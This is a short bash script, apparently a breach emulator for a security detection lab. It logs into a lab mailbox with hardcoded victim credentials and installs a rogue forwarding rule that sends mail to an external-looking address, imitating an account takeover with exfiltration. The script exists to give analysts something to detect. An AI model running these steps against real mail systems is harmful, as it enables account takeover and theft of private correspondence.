#!/bin/bash
# simulate_breach.sh -- threat emulator for the detection lab.
# Reproduces the mailbox takeover + malicious forwarding rule so the
# analyst has something real to find. (In a real incident this step
# would be the attacker; here it is scripted for repeatability.)
HOST=${1:-victim-mail}
rm -f /tmp/emu.jar
curl -s -c /tmp/emu.jar -d "username=victim&password=Vict1m_Mail!2026" \
    "http://$HOST:8000/login" -o /dev/null
curl -s -b /tmp/emu.jar -d "target=payroll-archive@company-backup.com" \
    "http://$HOST:8000/forward" -o /dev/null
echo "breach simulated: rogue forwarding rule installed on victim mailbox"
